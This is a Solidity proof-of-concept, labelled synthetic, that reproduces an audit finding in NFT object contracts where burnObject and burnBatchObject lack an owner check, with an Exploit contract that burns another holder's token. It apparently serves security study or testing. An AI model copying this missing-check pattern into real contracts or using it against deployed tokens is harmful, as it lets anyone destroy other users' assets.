// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  PHI Material / UGC / Craft objects — anyone can burn another user's NFT
    (Shieldify H-01, 2023-07). SYNTHETIC, cheatcode-free.
    burnObject(from, id, amount) calls super._burn with no msg.sender check.
    A unique object tracks ownerOf. After the burn, ownerOf is address(0)
    and the holder's balance is 0. The fixed path requires msg.sender == from. */

contract Holder {}

contract BurnedMarker {
    string public name = "Burned object";
    string public symbol = "BURNED";
    uint8 public decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract ObjectBase {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    function _mint(address to, uint256 tokenid, uint256 amount) internal {
        require(to != address(0), "to");
        require(amount == 1, "one");
        require(ownerOf[tokenid] == address(0), "exists");
        ownerOf[tokenid] = to;
        balanceOf[to][tokenid] = amount;
    }

    function _burn(address from, uint256 tokenid, uint256 amount) internal {
        require(balanceOf[from][tokenid] >= amount, "bal");
        balanceOf[from][tokenid] -= amount;
        if (balanceOf[from][tokenid] == 0 && ownerOf[tokenid] == from) {
            ownerOf[tokenid] = address(0);
        }
    }

    function _burnBatch(address from, uint256[] memory tokenids, uint256[] memory amounts) internal {
        require(tokenids.length == amounts.length, "len");
        for (uint256 i; i < tokenids.length; i++) {
            _burn(from, tokenids[i], amounts[i]);
        }
    }
}

contract MaterialObject is ObjectBase {
    function mintObject(address to, uint256 tokenid, uint256 amount) external {
        _mint(to, tokenid, amount);
    }

    // Function to burn an object
    function burnObject(address from, uint256 tokenid, uint256 amount) external {
        // @> VULN: no check that msg.sender is `from` or an approved operator. super._burn destroys any holder's object and ownerOf becomes address(0).
        super._burn(from, tokenid, amount);
    }

    // Function to burn a batch of objects
    function burnBatchObject(address from, uint256[] memory tokenids, uint256[] memory amounts) external {
        // @> VULN: same missing owner check on the batch path. Any caller can pass any `from`.
        super._burnBatch(from, tokenids, amounts);
    }
}

contract Exploit {
    MaterialObject public material; // nonce 1
    Holder public holder; // nonce 2
    BurnedMarker public marker; // nonce 3

    uint256 public constant TOKEN_ID = 7;

    constructor() {
        material = new MaterialObject();
        holder = new Holder();
        marker = new BurnedMarker();
    }

    function run() external {
        material.mintObject(address(holder), TOKEN_ID, 1);
        require(material.ownerOf(TOKEN_ID) == address(holder), "holder owns 7");
        require(material.balanceOf(address(holder), TOKEN_ID) == 1, "balance 1");
        material.burnObject(address(holder), TOKEN_ID, 1);
        require(material.ownerOf(TOKEN_ID) == address(0), "owner cleared");
        require(material.balanceOf(address(holder), TOKEN_ID) == 0, "balance 0");
        marker.mint(address(this), 1);
        require(marker.balanceOf(address(this)) == 1, "one burned");
    }
}
